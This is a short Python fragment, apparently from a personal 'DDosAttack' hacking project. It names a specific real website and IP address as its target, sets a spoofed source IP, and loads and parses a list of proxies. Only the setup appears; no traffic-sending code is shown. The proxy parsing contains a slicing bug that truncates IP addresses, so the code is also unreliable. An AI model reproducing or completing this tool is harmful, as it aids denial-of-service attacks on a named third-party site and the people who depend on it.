TargetDomain="www.marmaridis.gr"
Target='88.198.23.34'
TargetPort=80
Fake_Ip='182.21.20.32'
Proxies=["107.151.182.247:80"]
ProxyIP=["107.151.182.247"]
ProxyPort=["80"]

with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\DDosAttack\Proxies.txt","r") as File:
    for Line in File:
        Proxies.append(str(Line)[:-1])
        print (Line)

print (Proxies)

for i in range(len(Proxies)):
    for j in range(len(Proxies[i])):
        if Proxies[i][j]==":":
            ProxyIP.append(str(Proxies[i][:j-1]))
            ProxyPort.append(int(Proxies[i][j+1:]))

